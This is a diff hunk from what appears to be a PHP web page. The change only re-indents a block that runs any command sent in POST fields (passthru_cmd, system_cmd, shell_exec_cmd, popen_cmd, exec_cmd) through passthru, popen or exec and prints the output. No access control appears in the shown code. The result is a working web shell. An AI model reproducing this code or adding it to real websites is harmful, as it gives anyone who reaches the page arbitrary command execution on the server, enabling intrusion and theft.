@@ -39,24 +39,25 @@
     <pre style="white-space: pre-line;">
         <?php
 
-        if (isset($_POST['passthru_cmd'])) {
-            passthru($_POST['passthru_cmd']);
-        } else if (isset($_POST['system_cmd'])) {
-            passthru($_POST['system_cmd']);
-        } else if (isset($_POST['shell_exec_cmd'])) {
-            passthru($_POST['shell_exec_cmd']);
-        } else if (isset($_POST['popen_cmd'])) {
-            //start command and output console
-            $proc = popen($_POST['popen_cmd'], 'r');
-            while (!feof($proc)) {
-                echo fread($proc, 4096);
-                @ flush();
+            if (isset($_POST['passthru_cmd'])) {
+                passthru($_POST['passthru_cmd']);
+            } else if (isset($_POST['system_cmd'])) {
+                passthru($_POST['system_cmd']);
+            } else if (isset($_POST['shell_exec_cmd'])) {
+                passthru($_POST['shell_exec_cmd']);
+            } else if (isset($_POST['popen_cmd'])) {
+                //start command and output console
+                $proc = popen($_POST['popen_cmd'], 'r');
+                while (!feof($proc)) {
+                    echo fread($proc, 4096);
+                    @ flush();
+                }
+                pclose($proc);
+            } else if (isset($_POST['exec_cmd'])) {
+                exec($_POST['exec_cmd'], $out);
+                print_r($out);
             }
-            pclose($proc);
-        } else if (isset($_POST['exec_cmd'])) {
-            exec($_POST['exec_cmd'], $out);
-            print_r($out);
-        }
+
         ?>
     </pre>
 
